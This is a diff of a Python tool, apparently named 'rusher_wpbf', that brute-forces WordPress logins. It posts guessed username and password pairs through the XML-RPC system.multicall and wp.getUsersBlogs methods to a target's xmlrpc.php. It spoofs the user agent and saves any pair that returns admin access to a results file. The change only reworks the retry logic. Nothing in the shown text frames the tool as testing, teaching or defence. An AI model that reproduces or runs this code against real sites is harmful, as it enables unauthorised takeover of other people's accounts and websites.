@@ -58,30 +58,31 @@ class rusher_wpbf:
 
         try:
 
-            if self.try_login < 5:
+            xml = """<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>{}</string></value><value><string>{}</string></value></data></array></value></data></array></value></member></struct></value></data></array></value></param></params></methodCall>""".format(user, passwd)
+            x = requests.post(url="{}/xmlrpc.php".format(target), headers={ "User-Agent": self.useragent() }, data=xml, timeout=5)
 
-                xml = """<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>{}</string></value><value><string>{}</string></value></data></array></value></data></array></value></member></struct></value></data></array></value></param></params></methodCall>""".format(user, passwd)
-                x = requests.post(url="{}/xmlrpc.php".format(target), headers={ "User-Agent": self.useragent() }, data=xml, timeout=5)
+            if "<name>isAdmin</name>" in x.text:
 
-                if "<name>isAdmin</name>" in x.text:
-
-                    print("[+] [Success] [{}] -> ( {} | {} )".format(target, user, passwd))
-                    open("result-wp/site.txt", "a").write("{}/wp-login.php|{}|{}\n".format(target, user, passwd))
-                    os._exit(1)
-
-                else:
-
-                    print("[-] [Failed] [{}] -> ( {} | {} )".format(target, user, passwd))
+                print("[+] [Success] [{}] -> ( {} | {} )".format(target, user, passwd))
+                open("result-wp/site.txt", "a").write("{}/wp-login.php|{}|{}\n".format(target, user, passwd))
+                os._exit(1)
 
             else:
 
-                self.try_login = 0
+                print("[-] [Failed] [{}] -> ( {} | {} )".format(target, user, passwd))
 
         except:
 
             print("[-] [Error] [{}] -> ( {} | {} )".format(target, user, passwd))
-            self.req(user, passwd)
-            self.try_login = self.try_login + 1
+
+            if self.try_login < 5:
+
+                self.try_login = self.try_login + 1
+                self.req(user, passwd)
+
+            elif self.try_login > 5:
+
+                self.try_login = 0
 
     def __init__(self):
 
